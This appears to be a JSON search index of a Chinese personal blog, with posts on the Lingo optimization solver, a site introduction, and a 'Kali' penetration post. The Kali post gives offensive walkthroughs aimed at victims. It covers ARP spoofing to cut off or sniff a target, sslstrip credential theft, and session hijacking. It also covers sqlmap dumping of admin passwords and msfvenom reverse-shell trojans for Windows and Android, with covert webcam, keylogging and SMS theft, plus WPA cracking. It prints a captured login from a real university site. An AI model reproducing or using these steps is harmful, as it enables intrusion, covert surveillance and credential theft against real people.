{"pages":[{"title":"categories","text":"","path":"categories/index.html"},{"title":"tags","text":"","path":"tags/index.html"}],"posts":[{"title":"Kali","text":"总共是三台电脑A、B、CB可以pingAC，AC不能pingB，AC可以互ping 3.①：模型变换法对存在异方差性的模型进行适当的变量交换，使之成为满足同方差假定的模型，其前提是合理确定异方差性的具体形式。②：加权最小二乘法（WLS）对原模型进行加权，使之成为一个新的不存在异方差性的模型，然后采用最小二乘法估计其参数③：模型的对数变换对数变换使所测量的变量尺度缩小，进而缩小原变量差异的倍数，对数变换后的模型的残差$e_i$表示相对误差，其比绝对误差有较小的差异，进而降低异方差的影响。 第一个他将区间分为0-$\\frac{1}{2}$和$\\frac{1}{2}$其实只是为了让解答过程更加清晰一些而已，没有实际的意义。你完全可以也可以从$\\frac{1}{3}、\\frac{1}{4}$分开。 第二个同敛散问题你要观察，$\\int_\\frac{1}{2}^1\\frac{\\sqrt[m]{ln^2(1-x)}}{\\sqrt[n]{x}}dx$、$\\int_{\\frac{1}{2}}^1{\\sqrt[m]{ln^2(1-x)}}dx$，第二个积分中的被积函数的分母在这个区间内是一个有界的形式，而分子中的$ln(1-x)$在$x=1$的时候是无界的，所以只考虑分子就行了，他们同敛散。 后面的小于的话你构造一个新的函数然后求导就行了。 Kali渗透一、换源并安装open-vm-tools1.1 打开sources.list文件1leafpad /etc/apt/sources.list 1.2 在文件中添加如下内容1234deb http://mirrors.edu.cn/kali sana main non-free contribdeb http://mirrors.edu.cn/kali-security/sana/updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali-security/sana/updates main contrib non-freedeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free 1.3 更新并安装12apt-get updateapt-get install open-vm-tools-desktop fuse 二、安装中文输入2.1 下载搜狗在pinyin.sogou.com/linux中下载搜狗 2.2 安装终端进入上方文件路径，执行如下：12解决依赖：apt-get install -f安装：dpkg -i 包名 三、美化kali图标位置：/usr/share/icons/主题位置：/usr/share/themes/ 四、局域网断网攻击4.1 欺骗欺骗命令如下：1arpspoof -i 网卡 -t 被骗目标ip 网关 欺骗命令执行之前需要桥接自己的kali网络，其桥接过程如下： 右键kali系统，点开设置 将网络适配器设置成桥接模式 一次点开：编辑 -&gt; 虚拟网络编辑器 -&gt; vmnet0 -&gt; 确定 参数解读： 网卡：网卡是kali的网卡名，可以使用ifconfig查看（可见eth0） 被骗目标ip：受害者的ip，windows用户可以使用ipconfig查看 网关：网关是一个中间载体，同样可以使用ipconfig查看（默认网关） ip查询：我们在对受害者进行arp欺骗的时候，往往是不知道对方的ip的，但是我么可以使用如下命令偷偷的查询对方ip：1fping -asg 192.168.31.0/24 //网关最后是0+24 4.2 攻击4.2.1 瘫痪对方的电脑执行上述命令，即可让对方的网络瘫痪： 1arpspoof -i 网卡 -t 被骗目标ip 网关 执行之后，对方就无法正常使用网络了（比如访问网页、qq聊天等等一切网络活动），ctrl+z之后取消瘫痪操作 4.2.2 劫持对方的请求（账号，密码之类的）这里的劫持与上后面的瘫痪有点不同，劫持的话不能让对方网络瘫痪，所以我们在劫持之前需要进行如下命令操作（ip流量转发）：123cd /proc/sys/net/ipv4/ # 进入该目录cat ip_forward # 查看属性值，会发现输出0（默认是0，我们需要更改为1）echo 1 &gt; ip_forward```# 将ip_forward值改为1 如上操作之后我们继续执行arpspoof欺骗：1arpspoof -i 网卡 -t 被骗目标ip 网关 在欺骗之后，我们执行如下命令来进行嗅探：1ettercap -Tq -i eth0 执行之后发现，虽然这次对方可以正常使用网络，但是他的电脑已经在我们的监控中了，比如目标登录自己的某个站点，则在kali的终端上会输出对方的账号及密码 4.2.4 嗅探对方的浏览图片在进行上述的ip流量转发之后，我们可以使用如下命令来截取对方浏览页面的图片：1driftnet -i eth0 执行之后，会出现一个窗口 ，该窗口用于显示对方浏览页面的图片，并会将图片保存至kali本地 五、https账号、密码获取5.1 准备工作5.1.1 Vim：文本编辑器进入文件进行编辑：vim 123.txt （不存在会自动创建）退出文件编辑： 按ESC shift+： 输入q！ # 不保存退出 打开 etterc.conf文件1vim /etc/ettercap/ettc.conf/ 移动光标，把linux设置一下，将redir前的注释符删掉123# if you use iptables: #redir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" #redir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" 刚开始是不能编辑的，编辑操作如下 vim编辑：按一下 i 就可以对文件进行编辑了，在上述所述的位置将两个#去掉 vim保存：按一下ESC键，再按shift+:键，继续如下： wq 保存并退出 q! 不保存并退出 5.1.2 开启ssh：1/etc/initd/ssh start 5.1.3 sslstrip工具这个工具能够把https的链接还原为http。执行命令：1sslstrip -a -f -k 参数说明： -a -f -k 5.2 截取账号及密码 执行欺骗操作 1arpspoof -i eth0 -t 192.168.31.117 192.168.31.1 执行sslstrip 1sslstrip -a -f -k 执行ettercap 1ettercap -Tq -i eth0 当目标用户登录https登录的时候就可以在kali终端获取到他的账号以及密码，例子如下： 12345HTTP : 211.80.112.41:80 -&gt; USER: 1620814 PASS: 741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a INFO: mids.gench.edu.cn/_customize/passLoginCONTENT: loginTicket=425d9c18-424b-418d-b027-2095e618f829&amp;username=1620814&amp;password=741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a 分析： HTTP：ip及端口 USER：用户名 PASS：登录密码，注意：这里的密码并不是明文的，他是经过加密的，至于如何解密这个密码，以后有时间再来介绍 CONTENT：参数的组合 六、回话劫持，登录目标站点6.1 工具准备 arpspoof 欺骗 wireshark 抓包 ferret 重新生成抓包后的文件 hamster ferret安装，一次执行如下：123dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install ferret-sidejack:i386apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -yapt install ferret -y 6.2 过程（方法一） arpspoof欺骗 启动wireshark 1wireshark 点击eth0网卡，并让他持续运行下去 目标登录某个站点（上钩） 为了防止延迟，让wireshark再运行一段时间之后停掉wireshark 保存文件名为cookie至桌面，并格式为wireshark…….pacp 终端进入桌面，并执行如下命令（这个ferret有点问题，在这记录一下，以后再来看）： 1ferret -r cookie.pcap 执行hamster，会看到要求我们把代理改成本地（127.0.0.1）的，然后端口为1234 代开kali内置的火狐浏览器 点击设置 -&gt; Advanced -&gt; Network -&gt; Settings -&gt; 勾选Manual……并将http proxy改为127.0.0.1：1234 在kali中访问127.0.0.1：1234 之后会发现有个欺骗的ip，点开后就会出现很多的链接，ctrl+f找到 6.3 过程（方法二） ferret -i eth0 以后在记录 七、SQLMAP注入，ASP、PHP网站渗透7.1 科普7.1.1 ASPASP即Active Server Pages，是MicroSoft公司开发的服务器端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序。当服务器收到对ASP文件的请求时，它会处理包含在用于构建发送给浏览器的HTML（Hyper Text Markup Language，超文本置标语言）网页文件中的服务器端脚本代码。除服务器端脚本代码外，ASP文件也可以包含文本、HTML（包括相关的客户端脚本）和com组件调用。 [1-2]ASP简单、易于维护 ， 是小型页面应用程序的选择 ，在使用DCOM （Distributed Component Object Model）和 MTS（Microsoft Transaction Server）的情况下， ASP甚至可以实现中等规模的企业应用程序。 [3] 7.1.2 PHPPHP（外文名:PHP: Hypertext Preprocessor，中文名：“超文本预处理器”）是一种通用开源脚本语言。语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP 独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGI或者Perl更快速地执行动态网页。用PHP做出的动态页面与其他的编程语言相比，PHP是将程序嵌入到HTML（标准通用标记语言下的一个应用）文档中去执行，执行效率比完全生成HTML标记的CGI要高许多；PHP还可以执行编译后代码，编译可以达到加密和优化代码运行，使代码运行更快。 7.2 ASP渗透 监测是否存在注入1sqlmap -u 网站 如果该目标网站有注入，则会返回数据库的各种信息。 拆解目标网站的数据库表 1sqlmap -u 网站 --tables 根据User表拆解列名 1sqlamp -u 网站 --columns -T \"user\" username拆解出来后就不需要再进行拆解了 得到目标网站后台管理员的登录密码1sqlmap -u 目标网站 --dump -C \"username,password\" -T \"user\" –dump：下载数据-C “username,password” 列名 7.3 PHP渗透待更新 7.4 Cookie渗透待更新 八、Metasplooit8.1 基本操作 启动：msfconsole 漏洞利用工具：exploit 漏洞执行后的demo：payloads 8.2 远程控制软件8.2.1 实现过程 根据自己的ip设定一个木马（旧版使用msfpayload 不是 msfvenom -p），本操作是在桌面路径下执行 1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f exe &gt; test.exe 之后会生成一个test.exe木马程序，将文件拖至windows平台上 使用handler模块，本操作以及之后的操作是在msfconsole下执行 1use exploit/multi/handler 用shellcode程序 1set PAYLOAD windows/meterpreter/reverse_tcp 查看 1show options 设置参数，比如设置ip和端口 12set LHOST 自己的ipset LPORT 端口（55555） 执行并等待目标上钩 1exploit 8.2.2 木马基本功能当用户点击您的鱼饵之后，您就拥有了对方的所有权限，一下是一些基本的操作： sysinfo：获取到对方设备的系统信息 shell获取受害者的终端权限，通过这个终端您就可以完全控制对方的设备 background：将该权限放到后台，通过session -l（小写字母I） 1来重新获取会话 run vnc：开启远程桌面，执行之后就可以看到对方完整的桌面了。 注入进程 得到要注入的pid进程：ls migrate XXX（pid）注入 8.2.3 文件管理功能 download 下载文件 edit 编辑文件 cat 查看文件 mkdir 创建文件夹 mv 移动文件 rm 删除文件 upload 上传文件 rmdir 删除文件夹 8.2.4 网络及系统操作网络操作： arp 看arp缓冲表 ifconfig ip地址网卡 getproxy 获取代理 netstat 查看端口链接 系统操作： kill 杀进程 ps 查看进程表 reboot 重启电脑 reg 修改注册表 shell 获取终端 shutdown 关闭电脑 sysinfo 获取系统信息 8.2.5 用户操作和其他功能 enumdesktops 窗体 keyscan_dump 键盘记录–下载 keyscan_start 键盘记录–开始 keyscan_stop 键盘记录–停止 uictl 获取键盘鼠标控制权 record_mic 声音和音频录制 webscan_chat 查看摄像头接口 webscan_list 查看摄像头列表 webscan_stream 查看摄像头获取（偷窥） getsystem 获取管理员权限 hashdump 下载hash 九、安卓渗透9.1 实现过程 9.1 在终端根据自己的ip生成安卓木马1msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f apk &gt; test.APK 生成木马之后，我们将木马程序装在手机上即可。在这里呢，也就是我们平时比较常见的未知链接、不明邮件之类的鬼东西。 9.2 启动Metasplooit 1msfconsole 9.3 使用handler 1use exploit/multi/handler 9.4 设置安卓木马 1set PAYLOAD android/meterpreter/reverse_tcp 9.5 查看参数 1show options 9.6 设置参数 12set LHOST 192.168.31.147set HPORT 55555 9.7 启动监听 1exploit 9.2 常见操作 search 搜索文件（.jpg、.png、.bmp之类的文件），这个操作就有点邪恶了，大家一定要注意哦！！！ download 下载（.jpg、.png、.bmp之类的文件，还有你的所有短信、所有电话联系人…………………） webcam_stream 开启手机摄像头 webcam_snap 启动摄像头进行自动拍照（小心，这里拍照的过程中是不会有任何响应的，也就是说在这个过程中手机主人是不可能有任何察觉的） check_root 检查ROOT dump_calllog 下载电话记录 dump_contracts 下载短信记录 geolocat gps定位 十、Fluxion10.1 Fluxion下载下载fluxion源码并进入fluxion且运行：1234git clone https://github.com/FluxionNetwork/fluxion.git cd fluxion./fluxion.sh若提示没下载fluxion.sh，则按照要求下载就行 十一、密码破解 查看kali本机的密码字典 1locate wordlist 查看某个密码文件 1cat /etc/shadow 拷贝/etc/shadow密码文件 1cp /etc/shadow/ /root/Desktop/hash.list more /etc/login.defs 十二、Hydra1 十三、无线破解首先做的三步：123service network-manager stopairmon-ng check killaiarmon-ng start wlan0 开启监听：1airmon-ng statr wlan0 监听所有：1airodump-ng wlan0mon 监听指定bssid：1airodump-ng wlan0mon --bssid XXXX -c 频道 -w wpa(保存名) 将连接打掉：1aireplay-ng -0 2 -a [mac地址] -c [客户端mac地址] wlan0mon 12ifconfig wlan0mon downifconfig wlan0mon up 破解：1aircrack-ng -w [字典] /root/XXX.cap kali自带常用字典目录：12/usr/share/john/password.lst/usr/share/wfuzz/wordlist/ 查看字典文件是否含有该密码：1grep Password password.lst 查看字典有多少行：1cat [字典] | wc -l 解压文件：1gunzip rockyou.txt.gz 发现支持wps的AP123wash -i wlan0mon或者是airodump-ng wlan0mon --wps 爆破pin码：1reaver -i wlan0mon -b [ap mac] -vv -c [信道] wifite 伪造wifi：1airbase-ng -a [ap_mac] -c [信道] --essid [wifi名字] wlan0mon `echo [ap(wifi名)] &gt;essid.txtairolib-ng essid_db –import essid essid.txtairolib-ng essid_db –statsairolib-ng essid_db –import password ./names.txtairolib-ng essid_db –batchaircrack-ng -r essid_fb /root/wpa-01.cap","path":"2018/11/23/Kali/"},{"title":"Lingo解决优化问题","text":"Lingo解决优化问题前言前面，我们已经对Lingo有了一定的了解，但是要想真正的熟悉Lingo在解决优化问题中的强大之处，还需要不断加强相关训练，本文主要是使用Lingo来解决优化问题，该文的主要目的有以下三点： 希望能够提升自己对Lingo的相关操作并加强对优化问题的思维模式 方便日后对Lingo核心操作的回顾 希望每一位到来的朋友能够有所收获 若您对Lingo的安装及基本操作不是很了解，可暂且移步：Lingo安装、Lingo基本操作 优化模型介绍优化模型主要有三个基本要素：决策变量、目标函数、约束条件。其一般形式如下： $$opt \\ \\ \\ \\ f(x) \\s.t \\ \\ \\ \\ h_i(x)=0,\\ i=1,2,\\cdots,m \\g_j(x)\\leq0,\\ j=1,2,\\cdots,l$$ $opt$ 是“optimize”的缩写，表示“最优化”，一般为 $min$ 或 $max$，$f(x)$ 表示目标函数，$s.t.$ 是“subject to”的缩写“受约束于”，$h_i(x), g_i(x)$ 则表示约束条件，其中 $x$ 表示优化模型的决策变量。 运输问题问题描述 Question：有三个生产地和四个销售地，其生产量、销售量及单位运费如表所示，求总运费最少的运输方案以及总运费。 问题分析由题意，我们不难看出优化模型的决策变量是每个生产地向各个销售地运输的货量，即 $s_{ij}$。运输的总费用由各个产地向各个销售地运输所需费用之和，一个产地可以向多个销售地运输货物，一个销售地亦可接受多个产地的货物，所以可知优化模型中的目标函数是运输的总费用，即 $W=\\sum^3_{i=1}\\sum^4_{j=1}s_{ij}x_{ij}$。除此之外，该目标函数受到两个限制，即优化模型的约束条件： 生产地限制：每个生产地的运输量理应小于产生量，$\\sum_{j=1}^4s_{ij}\\leq a_i$ 销售地限制：每个销售地接受的货物理应等于销售量，$\\sum_{i=1}^3x_{ij}=b_j$ 优化模型构建有以上问题分析，为求出总运费最小的方案，我们可以构建该问题的优化模型如下： $$min \\ \\ \\ \\ \\sum^3_{i=1}\\sum^4_{j=1}s_{ij}x_{ij} \\s.t. \\ \\ \\ \\ \\sum_{j=1}^4s_{ij}\\leq a_i \\;;\\ \\sum_{i=1}^3x_{ij}=b_j \\ ;\\ s_{ij}\\geq0 \\ ;$$ 模型求解求解的Lingo代码如下： 1234567891011121314151617sets:supply/1..3/: a;demand/1..4/: b;link(supply, demand): c, x;endsetsdata:a = 30,25,21;b = 15,17,22,12;c = 6,2,6,7, 4,9,5,3, 8,8,1,5;enddatamin = @sum(link(i,j): c(i,j) * x(i,j));@for(supply(i): @sum(demand(j): x(i,j)) &lt;= a(i));@for(demand(j): @sum(supply(i): x(i,j)) = b(j)); 求解结果运行如上所示Lingo程序，我们可以得到如下结果： 通过上图展示，我们可以得到运输的最佳方案以及最小运费161个单位。运输方案图示如下： 待续","path":"2018/09/14/Lingo解决优化问题/"},{"title":"Lingo基本操作","text":"Lingo基本操作前言Lingo是一门主要求解非线性规划数学模型的编程软件，记得最初接触Lingo是在阅读《数学建模教程》一书，该书在第五章主要讲解使用Lingo来解决优化问题，也是在那个时候认识到了Lingo的强大之处。Lingo的使用就好比解决一道简单的数学问题，而你只需要使用Lingo支持的编程规范给其提供充足的已知条件即可，之后会自动使用相关算法为您解答。为了日后更加方便的查询Lingo相关知识，所以将Lingo的基本使用在此记录。 关于Lingo的下载及安装问题鄙人已做整理，可参考本篇教程 Lingo安装 Lingo基本运算符算术运算符^：乘方*：乘/：除+：加-：减 逻辑运算符在Lingo中，逻辑运算符主要用于集循环函数的条件表达式中，来控制在函数中哪些集成员被包含，哪些被排斥。 符号 说明 #and# 且，&amp; #or# 或，\\ \\ #not# 非，! #eq# 等于，== #ne# 不等于，!= #gt# 大于，&gt; #ge# 大于等于，&gt;= #lt# 小于，&lt; #le# 小于等于，&lt;= 关系运算符= 、&lt;= 、 &gt;= 函数标准数学函数 函数 说明 @abs(x) 绝对值 @sin(x) 正弦值，采用弧度制 @cos(x) 余弦值 @tan(x) 正切 @exp(x) 指数，$e^x$ @log(x) 自然对数 @lgm(x) gamma函数的自然对数 @sign(x) x&lt;0返回-1，否则返回返回1 @floor(x) 取整 @smax($x_1,x_2,\\cdots,x_n$) 取($x_1,x_2,\\cdots,x_n$) 中的最大值 @smin($x_1,x_2,\\cdots,x_n$) 取($x_1,x_2,\\cdots,x_n$) 中的最小值 集循环函数集循环函数用于遍历整个集，其基本语法如下： 12@function(setname[(set_index_list)[|conditional_qualifier]]:expression_list); @function相应于下面罗列的四个集循环函数之一；setname是要遍历的集；set_ index_list是集索引列表；conditional_qualifier是用来限制集循环函数的范围，当集循环函数遍历集的每个成员时，LINGO都要对conditional_qualifier进行评价，若结果为真，则对该成员执行@function操作，否则跳过，继续执行下一次循环。expression_list是被应用到每个集成员的表达式列表，当用的是@for函数时，expression_list可以包含多个表达式，其间用逗号隔开。这些表达式将被作为约束加到模型中。当使用其余的三个集循环函数时，expression_list只能有一个表达式。如果省略set_index_list，那么在expression_list中引用的所有属性的类型都是setname集。 @for@for函数用来对集中的成员形成约束。 例：产生序列[1,4,9,16,25] 12345sets:nums/1..5/: x;endsets@for(nums(i): x(i)=i^2); @sum@sum函数返回遍历指定集成员的一个表达式的和 例：求[1,2,3,4,5,6,7]中前五个数的和 1234567sets:nums/1..7/: x;endsets@for(nums(i): x(i)=i);s = @sum(nums(i) | i #le# 5: x(i)); @max，@min这两个函数分别用于返回指定集成员的一个表达式的最大值和最小值 例：求[1,2,3,4,5,6,7,8,9,10]中前五个数的最大值，后五个数的最小值 12345678sets:nums/1..10/: x;endsets@for(nums(i): x(i)=i);min_value = @max(nums(i) | i #le# 5: x);max_value = @min(nums(i) | i #ge# 6: x); 变量界定函数该函数主要是对决策变量做附加限制，一般用于@for函数中，主要有如下四种： 函数 说明 @bin(x) 限制x为0或1 @bnd(a,x,b) 限制x取a到b之间的值 @free(x) x取实数 @gin(x) x取整数 说明 Lingo中还有其他大量的函数，比如金融函数、概率函数、变量界定函数，由于目前鄙人暂时用不上，所以就暂且不记录了，待需要时再做进一步更新。 待更新","path":"2018/09/14/Lingo基本操作/"},{"title":"Lingo安装","text":"Lingo安装Lingo简介&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LINGO是Linear Interactive and General Optimizer的缩写，即“交互式的线性和通用优化求解器”，由美国LINDO系统公司（Lindo System Inc.）推出的，可以用于求解非线性规划，也可以用于一些线性和非线性方程组的求解等，功能十分强大，是求解优化模型的最佳选择。其特色在于内置建模语言，提供十几个内部函数，可以允许决策变量是整数（即整数规划，包括 0-1 整数规划），方便灵活，而且执行速度非常快。能方便与EXCEL，数据库等其他软件交换数据。 Lingo安装 Lingo下载地址：点击我&nbsp;&nbsp;&nbsp;&nbsp;密码：r6cy 下载到本地并解压后可见以下文件 双击运行LINGO-WINDOWS-IA32-12.0.exe可执行文件 单击Next 单击I accept 并Next 更改安装目录，Next 点击Only For Me，出现后续窗口点击OK 取消Launch，并Finish 打开“lingo12破解文件”并复制所有文件粘贴至Lingo所在目录 安装完成 安装声明&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;提供的安装文件皆来自网络共享资源，若想更好的体验请支持正版,Lingo官网下载地址:点击我。如内容有侵犯您的版权或利益的请联系QQ：26647879,WX：LT510087153，鄙人见后会在第一时间进行处理。","path":"2018/09/13/Lingo安装/"},{"title":"Begin","text":"关于本站既然这是本站的第一篇博文，首先得说下这个博客搭建的初衷： 好记性不如烂笔头，何况我根本没有好记性。记忆力这种东西就像内存，你渴望接受的东西越多需要记忆的量也就越大，所以会频繁性的造成遗忘之前所学所想的现象。当你某一天需要的时候，可能又会支付较大的时间成本才能再次捡起。所以希望能在本站记录一些自己的学习过程，以便日后的再次回顾。 记得在自己学习的时候，总会出现各种各样的玄学bug，而此时首先想到的就是去biadu、google、Stack Overflow等一些知名网站去寻找解决方法。然而令人崩溃的是这些解答大同小异，使用之后依然不能解决问题，原本一个小小的问题却需要花费大量的时间。所以希望来访的朋友都能够有所收获，在较短的时间内解决看起来不是问题的问题。 感觉拥有一个自己的个人博客很Cool，能够在这“为所欲为、畅所欲言”，而不像csdn、博客园那样的有所拘束。 基于以上三点，所以就有了建站的想法。虽然之前花了将近20天使用Django、ssm后端框架 + 前端 + 各种插件来搭建过博客，但是为了避免备案、维护等困扰，所以最终选择了成熟的Hexo来实现。经过两天的坚持，最终本站才初见成色。 本站历程： 2018-09-05 使用Hexo+Next成功搭建个人博客系统的基本功能 (￣_,￣ ) 2018-09-10 添加鼠标点击出现爱心效果 o(*≧▽≦)ツ┏━┓ 2018-09-27 成功引入DaoVoice网页在线联系功能 ╰(°▽°)╯ 2018-10-10 在本站右下角添加Aplayer音乐系统 (ˉ▽￣～) 切~~ 关于我鄙人是江西上饶的一位无名小卒，现于上海一所双非大学本科在读，现实生活中比较内向、形单影只，但热衷于各种技术，正朝着极客的方向努力。 Contcat me： Email：26647978@qq.com QQ：26647879 VX：LT510087153","path":"2018/09/08/Begin/"}]}